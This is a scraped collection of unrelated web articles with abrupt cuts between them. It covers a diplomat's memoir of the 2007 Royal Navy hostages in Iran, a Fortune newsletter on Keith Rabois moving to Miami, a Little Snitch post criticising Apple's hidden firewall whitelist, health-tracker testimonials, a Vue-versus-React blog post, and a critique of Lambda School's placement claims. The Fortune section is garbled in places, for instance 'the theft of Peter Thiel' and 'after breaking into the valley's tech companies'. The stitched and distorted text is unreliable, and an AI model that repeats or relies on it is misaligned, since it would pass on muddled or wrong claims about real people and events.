sections.</p><p>Bottom line, get hold of the Iranian officials at their Foreign Ministry and find out exactly what was going on and request access to the captured personnel. While I would be doing this, the Ambassador would be talking to the powers that be in London.</p><p>Now, I should have been granted access to the hostages under the terms of Article 36 of the Vienna Convention on Consular Relations, to which 170 nations are party which ” <em><strong>requires a nation arresting or detaining a foreign national to afford the detainee access to his or her consulate and to notify the foreign national of the right of consular access”</strong></em></p><p>In this case, Iran (which was a signatory) completely ignored the Convention. I was denied access despite repeated requests and it was not until the day of their release that I finally got to meet up with the sailors and marines at Tehran airport.</p><p>Several fruitless meetings at the Ministry of Foreign Affairs got me nowhere. They were not listening. At one stage I even showed them my warrant set out on parchment and signed personally by the Queen appointing me as Her Majesty’s Consul to Iran promising to protect the rights of British citizens in Iran. No reaction at all from the officials.</p><p>Because of this, the situation very quickly escalated upwards to levels way above my pay grade, and it fell to the Ambassador to quite rightly now take the lead on this.</p><p>From that point onwards, the whole sorry saga then slowly dragged on. It was humiliating to see the hostages paraded on Iranian TV almost every night. The Iranians were pulling out all their propaganda tools. The hostages were being shown happily playing board games, having slap up meals and on a couple of occasions one of them would be standing in front of a map of the disputed waterway explaining how they had intruded into Iranian waters.</p><p>If this was not bad enough, we than had to deal with the usual regime sponsored Basij rentamob being whipped up into a frenzy and stoning the embassy on the 1st April demanding that the hostages be put on trial.</p><p>Meanwhile, the Ambassador was doing his level best to gain some traction with the Iranians and I was left to deal with the foreign press who had flooded into Tehran to cover the story. Quite frankly, they would have been better off staying in London where this whole event was now being played out at Ministerial and Prime Minister/Presidential level.</p><p>I had nothing to tell them of any relevance or substance and they soon got bored with me.</p><p>Then, out of the blue Iran’s President Ahmadinejad on 4th April held a press conference to announce the release of the captives as a “gift” to the British people. They would be released the following day. At last!</p><p>Time to put repatriation logistics in place.</p><p>Fortunately, London had also got its act together and had chartered a British Airways plane to bring them back to the UK. I also learnt that the plane would also be bringing back a large number of the British media who had been encamped in Tehran for the story.</p><p>Therefore, it was decided that I and two of my colleagues from the embassy would escort the freed hostages back to the UK. My primary task was to keep the journalists at bay and away from them on the plane as obviously they needed to be debriefed officially back in the UK first.</p><p>The next day, we drove to Tehran airport and it was here that I finally got to meet the now freed hostages. They were decked out in shiny new suits (apart from the only female) and all clutching plastic carrier bags full of Iranian goodies….pistachio nuts, CD’s, Persian candles, books and a host of other Iranian treats.</p><div id="gallery-1"><figure><p><a href="https://www.mydiplomaticlife.com/mydiplomaticlifethetruestories/images-2/#main"><img width="510" height="286" src="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/09/images-2.jpg?fit=510%2C286&amp;ssl=1&amp;is-pending-load=1" alt="Iran" aria-describedby="gallery-1-1391" data-lazy-srcset="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/09/images-2.jpg?w=510&amp;ssl=1 510w, https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/09/images-2.jpg?resize=300%2C168&amp;ssl=1 300w" data-lazy-sizes="(max-width: 510px) 100vw, 510px" data-lazy-src="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/09/images-2.jpg?fit=510%2C286&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></a></p><figcaption id="gallery-1-1391"> RN hostages just after release in Tehran</figcaption></figure></div><p>They all looked fit and well and were looking forward to going home although rather nervous as to what people would think of their actions during captivity. They asked me my thoughts, I gave no answer.</p><p>Then after much farewell bidding between the hostages and the various Iranian functionaries who were accompanying them, we boarded the plane. The party occupied the front (first/business class) section of the plane, then a curtain was drawn across the aisle to keep them from the view of the journalists at the back who were very noisy and shouting at me for access.</p><p>Also on the plane that had travelled out from the UK were a couple of military people loaded down with mysterious large duffel bags. What was in these bags became clear once we were airborne. They contained uniforms!</p><p>As we left Iranian airspace, the order went out to the sailors and marines from one of the military types that they were to get out of their shiny new suits and back into uniform before landing in UK. They all looked rather startled by this and I think the reality of their situation was beginning to finally dawn on some of them.</p><p>Whatever they felt, they all dutifully got back into uniform. It was hard to believe that each and every uniform fitted them like a glove and they all had the appropriate rank badges. Impressive. Obviously someone back in the UK had done their homework on measurements.</p><p>At last, the plane approached Heathrow much to my relief. I had managed to have a chat with all of them on the flight but myself and my two colleagues had one hell of a job restraining the journalists in the back of the plane. Throughout the flight, they kept on shouting questions and camera lens would be poked through the dividing curtain to try and get the money shot…but their efforts were all in vain.</p><p>Finally, after a smooth landing, the aircraft taxied to the heavily cordoned-off VIP area. The whole party then disembarked from the plane and off they went for their debrief, medicals and reunions with families. Myself and my two colleagues remained on the plane and then left when things had quietened down.</p><p>All manner of things happened after this. The Captain of HMS Cornwall was relieved of his command. An enquiry was set up to look into the affair but it’s conclusions were neither here nor there.</p><div id="gallery-2"><figure><p><a href="https://www.mydiplomaticlife.com/british-naval-hostages-in-iran-the-backstory/thumbnail-5/#main"><img width="192" height="335" src="https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-5.jpg?fit=192%2C335&amp;ssl=1&amp;is-pending-load=1" alt="Royal Navy Hostages In Iran - What Really Happened" aria-describedby="gallery-2-1523" data-lazy-srcset="https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-5.jpg?w=192&amp;ssl=1 192w, https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-5.jpg?resize=172%2C300&amp;ssl=1 172w" data-lazy-sizes="(max-width: 192px) 100vw, 192px" data-lazy-src="https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-5.jpg?fit=192%2C335&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></a></p><figcaption id="gallery-2-1523"> RN Hostages In Iran</figcaption></figure></div><p>Rumours of a deal involving 5 Iranian detainees held by the US in Iraq and a freed Iranian diplomat abounded. Did George W do a favour for his old pal Yo Blair? we will never know. Of course any rumours of a deal were vehemently denied in London.</p><p>Then (in my opinion) came the disgraceful episode of one of the hostages being permitted to sell their story to a national newspaper for a reputed Â£100,000.</p><p>Personally, I was just thankful it was all over at my end in Tehran. Of course we would continue to protest to the Iranians about their disregard of the Vienna Convention, using the hostages as propaganda tools, the aggression of the IRGC, but knowing that at the end of day. nothing would change in the end.</p><p>So I will just leave this particular story here with a quote from British Admiral Jonathon Band who said at the time “it was not our finest hour”</p><p>Harking back to my saying about Iranians taking hostages when feeling twitchy. With this latest incident, they had now embarrassed the UK twice within the space of a few years. Then in 2016, a similar scenario was played out, this time the seizing of 10 US …</p></div></div>

He tells me he’s “moving soon.”</p><p>Rabois revealed his decision to decamp during our conversation at <a href="https://meridian.stellar.org/index.html">Meridian Conference</a>, an event organized by the Stellar Development Foundation group focused on cryptocurrency.  (Rabois, an investor in Stripe, joined Stellar’s board of directors after Stripe invested in Stellar six years ago.)</p><p>“I think San Francisco is so poorly run and managed that it’s impossible to stay here,” Rabois said.  He believes he’s not the only one abandoning the Bay Area, a place he’s called home for two decades.  He cited anecdotal evidence of many people leaving his social circles and noted, “COVID kind of masks that stuff.  It is not as obvious where people are moving and whether they have actually moved since everyone is working remotely.</p><p>Rabois is one of the many forsakers in the Bay Area.  His planned departure follows the theft of Peter Thiel, Rabois’ former Stanford buddy and PayPal partner, <a href="https://www.latimes.com/business/la-fi-peter-thiel-20180215-story.html">in Los Angeles in 2018</a>.  (Rabois joined the venture capital firm of Thiel Founder’s Fund last year.) In a widely read IPO prospectus this year, Alex Karp, CEO of Palantir, a PayPal spinout and Rabois investment, also stated that he was <a href="https://www.bizjournals.com/denver/news/2020/08/19/palantir-peter-thiel-alex-karp-headquarters-denver.html?ana=e_den_bn_breakingnews_breakingnews&amp;j=90524545&amp;t=Breaking%20News&amp;mkt_tok=eyJpIjoiWVRBek1HSTVabVpoTlRNMyIsInQiOiI4WEMzeGcrYStNT3dpK2NpZTBLNVwvZERWUzdBYzhWZkhFenY0K3VlNGxOeUpwdFh4ZHJ6WDFRZkxCZndDT1NVankxWW5hbFdibHl6cHJNd2tYNW9CWDRMb1c0STB1WGRxODlYaGppclFyRk5EZGllQ1JOejZVRTFTUUtUVFpwK3AifQ%3D%3D">company relocation to Colorado</a> after breaking into the valley’s tech companies, calling them unpatriotic for <a href="https://fortune.com/2020/08/26/palantirs-filing-to-go-public-invokes-patriotism-and-attacks-silicon-valley/">military contracts poo-poo</a>.  And Jack Dorsey, CEO of <a href="https://fortune.com/company/twitter/" target="_blank" rel="noopener noreferrer">Twitter</a> and Square, where Rabois worked as director of operations for three years, planned to settle in Africa <a href="https://www.cnbc.com/2020/03/05/twitter-ceo-jack-dorsey-reconsidering-africa-move-on-coronavirus-fears.html">before the pandemic hits</a>.</p><p>Add Rabois to the list of emigrants.  He said COVID had helped show that the perceived disabilities in leaving California were “more psychological than real.”</p><p>Data from Opendoor (which Rabois co-founded) and competing companies like Zillow reveal a trend.  “Rental searches in the Bay Area are in free fall, down 30%,” said Rabois.  In big cities like New York and Los Angeles, rental searches are also dropping like crazy, as people recognize “all the downsides” of city living – a higher cost of living and closer neighborhoods – with a few. – some of the mostly social benefits, he said.</p><p>“It’s very clear right now, people are massively changing their preferences,” said Rabois.  He added, however, that it remains to be seen whether the trend will continue once a vaccine is widely distributed and cities are able to reopen.</p><p>So where is Rabois going?  Just in time to avoid a winter on the west coast, he buys a house in the sun.  “Miami is an incredibly beautiful, cosmopolitan city, has an interesting mix of New Yorkers, Latin Americans and Europeans,” Rabois said of his future home.  Oh, and “There is no state income tax.</p><p>“Living in the Bay Area for 20 years is like, everything you wish you had,” Rabois said.  “I’m a fan of the hot weather and the water, so it feels like I’m going on vacation.”</p><p>How many will follow?</p><p>***</p><p>PS I don’t mean <em>I told you</em> for now, but <a href="https://www.macrumors.com/2020/11/15/macos-big-sur-update-bricking-some-macbook-pros/">this first report</a> new MacOS computers, as Aaron pointed out yesterday, seems to confirm my theory that the deployment of Apple’s new technology <a href="https://fortune.com/2020/11/10/apple-new-mac-chips-cpu/">would not go as planned</a>.</p><p><strong>Robert hackett</strong></p><p>Twitter: <a href="https://twitter.com/rhhackett">@rhhackett</a></p><p><a href="mailto:robert.hackett@fortune.com">robert.hackett@fortune.com</a></p><nav role="navigation" aria-label="Continue Reading"><h2>Continue Reading</h2></nav></div></div></article></main></div></div></div></div>]]>

                <!--kg-card-begin: image--><figure><img src="https://blog.obdev.at/content/images/2020/11/hole-in-the-wall.png"></figure><!--kg-card-end: image--><!--kg-card-begin: markdown--><p><a href="https://apple.com/privacy">Apple on Privacy</a>:</p>
<blockquote>
<p>Privacy is a fundamental human right. At Apple, it’s also one of our core values. Your devices are important to so many parts of your life. <strong>What you share from those experiences, and who you share it with, should be up to you. We design Apple products to protect your privacy and give you control over your information.</strong> It’s not always easy. But that’s the kind of innovation we believe in.</p>
</blockquote>
<p>We could not agree more. That’s why we created Little Snitch in the first place, 18 years ago.</p>
<p>It is your right to know where your computer connects to. To whom it talks. It’s your right to see these connections. It’s your right to allow them. And it’s your right to deny them.</p>
<p>That’s our philosophy. You should always be able to see what’s going on and to make informed decisions.</p>
<p>When we first discovered that Apple’s new Network Extension Framework — that all third party firewalls are now required to use on macOS Big Sur<sup><a href="#fn1" id="fnref1">[1]</a></sup> — didn’t report network traffic during some large software update download, we reported this bug to Apple on July 1 (FB7839544), hoping it would be fixed in the final version of Big Sur.</p>
<p>But it came worse. Three months later we realized, that a number of other Apple services like App Store, Maps or FaceTime also showed this strange behavior of acting invisibly, bypassing the new filter API. So we reported our new findings again on October 1 (FB8762834).</p>
<p>As it turned out, this behavior is on purpose. There’s an <a href="https://www.obdev.at/support/littlesnitch/245914647368270">explicit whitelist</a> that allows certain macOS services to bypass any third party firewalls and to communicate on the Internet without being even noticed by the user. A hole in the wall.</p>
<p>It is understandable, that some network connections are essential for a secure and smooth system operation. It makes sense to <a href="https://blog.jacopo.io/en/post/apple-ocsp">check the validity of signing certificates</a> to effectively protect against malware attacks. It makes sense to download critical security updates in a timely fashion to prevent malware from exploiting vulnerabilities that have already been fixed. Blocking such connections would usually cause more harm than good.</p>
<p>But hiding these connections completely from the user makes no sense. It contradicts the idea of a transparent and trustworthy system and undermines the user’s trust in that system.</p>
<p>We’ve been facing similar challenges in Little Snitch as well. If we allow users to block each and every network connection, they might inadvertently render their computer unusable, causing DNS lookups to hang, preventing users from logging into their accounts and more.</p>
<p>How did we solve it? By being transparent and informative. By telling users about the possible consequences that the denial of certain connections might have, and in some cases recommending them not to do so. By providing default firewall rules to allow a few essential connections, but still letting users opt out. By developing the <a href="https://obdev.at/iap/">Internet Access Policy</a> that also gives third party developers the possibility to explain, which connections their apps are about to make, and whether it’s OK or not to deny them.</p>
<p>But the final decision whether to accept the possible consequences should always be left to the user, to you.</p>
<p>In the light of the recent public discussions that this topic has triggered we are extremely confident that Apple stands by their word to give users control over their information and will therefore eliminate this kind of whitelisting in a future macOS update.</p>
<p>Just yesterday Apple announced their willingness to address such privacy concerns by improving the way how online certificate checks are performed, and even <a href="https://support.apple.com/en-us/HT202491">adding the possibility to completely opt out of these security protections</a>.</p>
<p>Until then we won’t be restless either. We are already working on an alternative technique how to make even those currently hidden connections visible again in Little Snitch in one of our next updates. Looks very promising so far!</p>
<p>So stay tuned and protect your privacy. It’s yours, after all.</p>

To have instant feedback on what food and exercise are doing to your glucose levels allows you to make better choices because you can experiment. This is a company that is really going to change a lot of people’s lives and quality of life for the better, and I’m really excited to be involved.</span></p></blockquote><p><span>–Matthew “Delly” Dellavedova, NBA player (Cleveland Cavaliers)</span></p><blockquote><p><span>Working as a clinician I’ve seen the power of acting on biometrics when people have access to them. The problem is that people are gated to information about their own bodies with complex and expensive barriers. The future of medicine is empowering people with their own biometrics, and Levels is the first company doing that in a meaningful way.</span></p></blockquote><p><span>–Dr. Anthony Gustin, Founder of Perfect Keto</span></p><blockquote><p><span>We have real-time data and metrics on the stuff we own: the mileage of our cars, the usage of water in our house, the performance of our 401k retirement accounts, etcetera. Yet, with our most important asset — our own health — we’re stuck in the stone ages without any access to our metabolic metrics and data.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section data-v-f94c7cca=""> <!----> <div data-v-0cf44990="" data-v-f94c7cca=""><div><p>A former front-end student of mine (Zoe*) recently emailed me, and honestly wanted to understand why is it that I chose to code <a href="http://swimm.io/">Swimm</a>, with Vue.Js and not React:</p>
<blockquote>
<p>“I just have one question for you: Why Vue?[...] I hope you're not rolling your eyes thinking - “ah no, another question about Vue”. Although knowing you and your passion, I'm sure you have a pretty strong opinion that could swallow me into becoming a Vue fan without even knowing it.”</p>

<p>Vue.js gained a reputation in recent years as an edgy must-know framework, but developers often question what the hype is about, how it relates to them and what web framework they should choose for their product.</p>
<p>While there might be some over-hype around the expected <a href="https://madewithvuejs.com/blog/vue-3-roundup#:~:text=Vue%203%20release%20date,2020%2C%20according%20to%20the%20roadmap.">Vue 3 release due in Q3 2020</a>, Vue has been gaining traction for a few years now, and it was just a matter of time for <a href="https://www.netguru.com/blog/13-top-companies-that-have-trusted-vue.js-examples-of-applications">bigger companies</a> like Netflix, Behance, Grammarly, Alibibaba, GitLab and others, to pick it up. Yet according to <a href="https://insights.stackoverflow.com/survey/2020#technology-most-loved-dreaded-and-wanted-web-frameworks-wanted2">Stackoverflow’s 2020 developer</a> React.js is still the most wanted web framework (Vue.js coming in second).</p>
<h3>Vue.js vs React In a Nutshell</h3>
<p>I first used Vue at <a href="https://www.imcreator.com/">IM Creator</a>, a product I co-built originally with JQuery, and Vue was a breath of crisp air in my face. It was user friendly and progressive as it enabled me to use the framework for specific parts each time, without huge migrations. I could then for example create a menu in Vue, while the rest remained in legacy JQuery. What’s there not to like?</p>
<p>With Swimm (a new dev tool product) it wasn't even a question. I started our PoC with Vue.js and continued since then to our Beta self-served version. Several benefits should speak volumes to Startups these days especially compared to React:</p>
<ul>
<li><strong>Vue is Lightweight and Flexible</strong>. It means it's a framework that feels more like a library than a framework at all. You can try it out first in small use cases in your app before going all-in.</li>
<li><strong>Vue is less intrusive than React</strong> and much easier to onboard. Project components and structure in Vue are similar whie projects in React each vary in architecture and implementation. I find that you can recognize Vue structures easily which is what speeds up onboarding time for any developer learning a new codebase. Vue becomes easier to maintain. This is especially true for smaller products.</li>
<li><strong>Readability is key</strong> - Vue is based on the most basic principles of the Web and is more readable than React. The html/css and JS are separate while in React everything is in JS.</li>
<li><strong>Indie at its core</strong>. While it’s my personal opinion, many developers appreciate tools that are not backed by tech giants (for example React backed by Facebook, and Angular by Google), but rather grows from a community and that is why it is highly oriented to developer needs.</li>
</ul>
<h3>When does React Trump Vue.js:</h3>
<ul>
<li><strong>React is still most wanted by the industry</strong>. That can be a problem for new coders. From my recent experience recruiting for Swimm’s growing dev team, Vue is still harder to recruit for because of React’s persistent popularity. <strong>By the same token</strong>, even if many of the larger companies are picking it up, it’s still part of side projects and not the main product. This is why for the <a href="https://www.itc.tech/">ITC.tech</a> web-dev Bootcamp, I created a React-based curriculum.</li>
<li><strong>Flexibility in some aspects</strong>. React still has the ability to split between the visibility of a component and maintenance of the component - and still provides more flexibility.</li>
<li><strong>Docs are light years ahead</strong>. The features Release in React is fast paced and as React docs are extensive and elaborate. [Try skimming through all of the 500 pages of questions on React on Stackoverflow].</li>
</ul>
<h3><strong>To Sum it Up: A Note to Zoe</strong></h3>
<blockquote>
<p>“ Hi Zoë,</p>
<p>I chose Vue for many reasons.</p>
<p>It is easy to integrate into existing projects (That was my need the first time I used Vue)</p>
<p>It is has a more readable syntax</p>
<p>It's really reactive (no need to explicitly call the set function)</p>
<p>It is not maintained by a big company (Facebook / Google)[...]</p>
<p>Give it a try :)”</p>
</blockquote>
<p>Of course there is always a trade-off. These lessons learned reflect my personal views, insight gained from working in various startups and alongside numerous tech clients. As always, <a href="https://www.mindk.com/blog/react-vs-vue/">in depth research</a> is required to make sure which framework best suits your business case. But if you’re looking for a flexible  non-enterprise solution, Vue has proved easy to learn, scalable, user-friendly backed by a solid community that caters to other developers.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
       <p>Lambda School is a coding bootcamp that only charges tuition if you get a job. Founder/CEO Austen Allred frequently takes to Twitter, defending his bootcamp against <a target="_blank" rel="noopener" href="https://nymag.com/intelligencer/2020/02/lambda-schools-job-placement-rate-is-lower-than-claimed.html">allegations of fraud</a>, and rebutting critics with case after case of student success.</p>
<p>I was initially excited about Lambda School, but have slowly grown disillusioned over time. So when they released their <a target="_blank" rel="noopener" href="https://lambdaschool.com/reports/2019-outcomes-report#fast-facts">2019 H1 Outcomes Report</a>, I was excited to finally access a ground truth and put an end to all the speculation.</p>
<p>Instead, I found a consistent pattern of deception.</p>
<p>In the rest of this piece, I’ll walkthrough a number of examples, in which Allred:</p>
<ul>
<li>Claims a job placement rate of 86%, when the actual number is as low as 55%, and at least as bad at 70%</li>
<li>Misrepresents graduate salaries on Twitter, despite claiming a random sample</li>
<li>Calls regulatory approval a “significant endorsement”, despite a troubled history of bans</li>
<li>Lies about having been homeless</li>
</ul>
<p>Some of these are blatant and explicit, some are more subtle. I’ve done my best to present the facts fairly, and leave the rest up to your judgement.</p>
<h3 id="1-Allred-Misrepresents-Student-Outcomes"><a href="#1-Allred-Misrepresents-Student-Outcomes" title="1. Allred Misrepresents Student Outcomes"></a>1. Allred Misrepresents Student Outcomes</h3><p>In early 2019, <a target="_blank" rel="noopener" href="https://twitter.com/austen/status/1082815326960533504?lang=en">Allred took to Twitter</a> to share student outcomes, listing the following salaries:</p>
<ol>
<li>J: $80,000+</li>
<li>S: $80k</li>
<li>D: $110k base, ($130k total)</li>
<li>C: $130k</li>
<li>T: $90k</li>
<li>L: $140k</li>
<li>J: $85k</li>
<li>L: $89k</li>
<li>A: $85k</li>
<li>R: $75k</li>
<li>S: $70k</li>
</ol>
<p>A year later, when the <a target="_blank" rel="noopener" href="https://lambdaschool.com/reports/2019-outcomes-report#fast-facts">Outcomes Report</a> was released, it cited a median salary of just $70,000. In stark contrast, Allred’s 11 Tweets report exactly 0 students making less than $70,000. Statistically, that’s like flipping a coin and getting 11 heads in a row (probability .00049).</p>
<p>This seems bad, but whatever, Allred is just highlighting a few heartwarming anecdotes right? Surely he doesn’t actually claim that this is a randomly selected sample?</p>
<p><a target="_blank" rel="noopener" href="https://twitter.com/Austen/status/1082818077132091393">Except he absolutely does:</a><br><img src="https://applieddivinitystudies.com/images/allred-tweet.png"></p>
<p>To see just how poorly Allred’s claims line up against the official <a target="_blank" rel="noopener" href="https://lambdaschool.com/reports/2019-outcomes-report#fast-facts">Outcomes Report</a>, we can plot the histograms side by side:<br><img src="https://applieddivinitystudies.com/images/lambda-outcomes.png"></p>
<p>Allred claims that his examples were randomly selected, but his own statements are contradicted by the official outcomes report.</p>
<h3 id="2-Allred-Repeatedly-Misrepresents-Job-Placement-Rates"><a href="#2-Allred-Repeatedly-Misrepresents-Job-Placement-Rates" title="2. Allred Repeatedly Misrepresents Job Placement Rates"></a>2. Allred Repeatedly Misrepresents Job Placement Rates</h3><p>Earlier this year, <a target="_blank" rel="noopener" href="https://nymag.com/intelligencer/2020/02/lambda-schools-job-placement-rate-is-lower-than-claimed.html">New York Magazine reported</a> that Lambda school had marketed itself as having an 86% job placement rate, but then released an investor memo reporting a much lower rate of just 50%.</p>
<p>Allred took to podcasts, explaining in an <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=osrytvuiU8Y&amp;t=3m20s">interview with Jason Calacanis</a>:</p>
<blockquote>
<p>When we talk to investors, we talk in terms of enrolled students… of those students who were enrolled, X% were hired. Whereas when schools speak publicly, they speak in terms of graduated students. So obviously those two numbers are always going to be different.</p>
</blockquote>
<p>He goes on to clarify:</p>
<blockquote>
<p>That 86% was somewhat out of date… so we quickly put together what the real numbers would have been, which was 78%.</p>
</blockquote>
<p>Okay, so that seems reasonable enough. Case closed?</p>
<p>But then the official <a target="_blank" rel="noopener" href="https://lambdaschool.com/reports/2019-outcomes-report#fast-facts">Outcomes Report</a> was released, and contradicted Allred’s own statements: </p>
<ul>
<li>Of the 448 students in the cohort, only 318 graduated</li>
<li>Of those 318, only 284 graduated on time</li>
<li>Of 284 graduates, Lambda could only reach 255</li>
<li>Of those 255, only 201 had jobs</li>
<li>Of those 201, Lambda “did not have salary data… due to our data collection methods”, giving us data for 178 students</li>
</ul>
<p><strong>The job placement rate for enrolled students is 201 out of 448, or 45%. The job placement rate for graduated students is 201/318, or 63%.</strong></p>
<p>It actually gets worse. The original Lambda School claim was:</p>
<blockquote>
<p>86% of Lambda School graduates are hired within 6 months and make over $50k a year</p>
</blockquote>
<p>But according to the outcomes report, 26 of the placed graduates are making under $50,000. <strong>The actual placement rate for graduates making over $50,000 is just 55%</strong>. That’s a far cry from the 86% they claim, and much closer to the 50% reported by New York Magazine.</p>
<p>To be clear about timing, the New York Magazine article was published February 19th 2020, the <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=osrytvuiU8Y&amp;t=3m20s">interview</a> was on March 3rd, and the Outcomes Report was <a target="_blank" rel="noopener" href="https://twitter.com/lambdaschool/status/1244054419471302664">published March 28th 2020</a>. So these should all be about the same cohort, or at least a similar set of students.</p>
<p>So where does the 78% come from? Following article, Allred published a <a target="_blank" rel="noopener" href="https://www.linkedin.com/pulse/note-outcomes-data-lambda-school-austen-allred?articleId=6637802701117882368">note on LinkedIn</a> with the following chart:<br><img src="https://applieddivinitystudies.com/images/lambda-flow.png"></p>
<p>So 78% is what you get if you ignore students who graduated late, ignore students who have yet to graduate,  ignore the “graduated and disengaged” students, and pretend everyone is making over $50,000.</p>
<p>To his credit, Allred does provide another table which includes disengaged sudents and reports a 70% placement rate. Not only is this a far cry from the 86% originally reported, it also includes the 15% of placed students making under $50,000.</p>
<p>Although it may seem fair to count late graduates in the H2 report, note that this is a misrepresentive sample. Students who graduate late will likely have worse results later on, and underperform students who graduated on time. If Lambda wanted to account for this, they could have included 2018 H2 late graduates in the 2019 H1 report, but they neglected to do so.</p>
<h3 id="3-Allred-Misrepresents-Legal-Action-Against-Lambda-School"><a href="#3-Allred-Misrepresents-Legal-Action-Against-Lambda-School" title="3. Allred Misrepresents Legal Action Against Lambda School"></a>3. Allred Misrepresents Legal Action Against Lambda School</h3><p>In March 2019, <a target="_blank" rel="noopener" href="https://news.ycombinator.com/item?id=19374417">Allred wrote</a>:</p>
<blockquote>
<p><strong>Regulators love us</strong> - they’re sick of for profit schools promising a lot and delivering little except debt. [emphasis mine]</p>
</blockquote>
<p>December the same year, <a target="_blank" rel="noopener" href="https://twitter.com/sandofsky/status/1211717254712135680?lang=en">it was revealed</a> that Lambda was actually operating illegally, with no approval from regulators.</p>
<p>Okay, so this looks bad, but it doesn’t mean Allred is lying. It’s entirely possible that he thought regulators loved Lambda in March, and wasn’t corrected until a $75,000 fine hit the following month.</p>
<p>When Lambda finally did get approval to operate in California, Allred <a target="_blank" rel="noopener" href="https://lambdaschool.com/the-commons/baby-steps-incentive-aligned-higher-education-job-training">wrote</a></p>
<blockquote>
<p>Over the past year, Lambda School worked to advance an ambitious goal: become the first online school approved by California regulators to offer ISAs. <strong>We achieved a major victory when state regulators licensed us as a school in August, representing a significant endorsement</strong> for our all-online, career-focused education model. However, in order to secure this approval, we made the difficult decision to stop offering our ISA option to students in California.</p>
</blockquote>
<p>To be clear, none of this is an outright lie, but it is a dishonest representation of the regulatory environment. To recap:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://news.ycombinator.com/item?id=19374417">March 2019</a>: Allred claims “Regulators love us”</li>
<li><a target="_blank" rel="noopener" href="https://twitter.com/sandofsky/status/1211717254712135680">April 2019</a>: Regulators fine Lambda $75,000</li>
</ul>
<p>Then Lambda applies for approval, leading to this saga in which:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://twitter.com/sandofsky/status/1211786705428086784">July 2019</a>: Regulators deny the application, ordering Lambda to cease operations</li>
<li>Lambda continues operations anyway</li>
<li><a target="_blank" rel="noopener" href="https://twitter.com/sandofsky/status/1211793179831177216">December 2019</a>: Lambda re-applies for approval, is told to cease operations</li>
<li>Lambda continues operations anyway</li>
<li><a target="_blank" rel="noopener" href="https://lambdaschool.com/the-commons/an-update-on-lambda-school-and-isas-in-california">June 2020</a>: Lambda submits another application, regulators say they cannot use ISAs</li>
<li>Lambda finally agrees to stop using ISAs in California</li>
<li><a target="_blank" rel="noopener" href="https://lambdaschool.com/the-commons/baby-steps-incentive-aligned-higher-education-job-training">October 2020</a>: Allred calls regulator approval a “major victory” and “significant endorsement”</li>
</ul>
<p>As best I can surmise, those are the facts of this case. You can decide for yourself if you think Allred is acting with integrity.</p>
<h3 id="Bonus-Allred-Lies-about-Experiencing-Homelessness"><a href="#Bonus-Allred-Lies-about-Experiencing-Homelessness" title="Bonus: Allred Lies about Experiencing Homelessness"></a>Bonus: Allred Lies about Experiencing Homelessness</h3><p>This has nothing to do with Lambda School, and is admitadely somewhat gratuitous. But it does point to continued dishonesty on the part of Allred, and is too blatant to ignore.</p>
<p>In 2017, Allred <a target="_blank" rel="noopener" href="https://twitter.com/Austen/status/940658401209491456">tweeted</a>:</p>
<blockquote>
<p>I was homeless, had no skills, no degree, just $300 and a laptop, but that’s all you need.</p>
</blockquote>
<p>In a <a target="_blank" rel="noopener" href="https://news.ycombinator.com/item?id=17938403">2018 Hacker News comment</a>, he wrote:</p>
<blockquote>
<p>I’m also formerly homeless…. I know how hard it is to focus on getting a job when you’re just trying to survive</p>
</blockquote>
<p>An <a target="_blank" rel="noopener" href="https://bagholderreport.substack.com/p/lambda-school-is-the-culmination">article</a> includes a screenshot of an Allred’s reply to a tweet which reads:</p>
<blockquote>
<p>I have been homeless, slept on those same streets [1]</p>
</blockquote>
<p>The arc from homeless to multi-millionaire founder would be inspiring, except that it isn’t actually true.</p>
<p>In a <a target="_blank" rel="noopener" href="https://news.ycombinator.com/item?id=6758165">2013 Hacker News comment</a>. Allred writes:</p>
<blockquote>
<p>I lived in a Honda Civic this summer as I was getting a startup off the ground… and <strong>I had a half dozen people offer to let me stay at their place or crash on their couch rent-free.</strong></p>
<p>….As a result, <strong>I wasn’t living in a car for lack of other options</strong>, but rather out of belief that I could create something by sheer will-power, and that I was going to do that come hell or high water. My homelessness was a matter of seeking something greater than myself, not being lost to poverty. [emphasis mine]</p>
</blockquote>
<p>Similarly, in a now-deleted blog post titled <a target="_blank" rel="noopener" href="https://archive.is/OqxKP">Voluntary Homeless in Silicon Valley</a> Allred writes:</p>
<blockquote>
<p>Candidly, living in a car in Silicon Valley had much more appeal to me than a single bed and a shared bathroom… Much more than money, what fuels me is obsession with minimalism, reading way too much Thoreau, and trying to continually see life from a different angles…&nbsp; It’s about questioning society at its fundamentals, and seeing what a life not tied down by a foundation really feels like. And so far I love it.</p>
</blockquote>
<p>So again, Allred’s claims are… not technically a lie? I mean he did sleep out of a car, but he did it voluntarily. You’re free to make your own judgements, but when I hear “I have been homeless, slept on those same streets”, I do not think of someone with half a dozen offers of free housing. That isn’t poverty, it’s cosplay.</p>
<h3 id="Conclusion-Why-does-any-of-this-matter"><a href="#Conclusion-Why-does-any-of-this-matter" title="Conclusion: Why does any of this matter?"></a>Conclusion: Why does any of this matter?</h3><p>Am I just piling onto an already heavily criticized company? Am I guilty of being a critic rather than a creator?</p>
<p>I initially wrote about this purely using Lambda School as an example to illustrate a broader point about incentive alignment. But the more I read, the clearer it became that they were just consistently dishonest. Not outright fraudulent, but just really misleading about everything from student outcomes, to regulatory pressure, to the founder’s own history.</p>
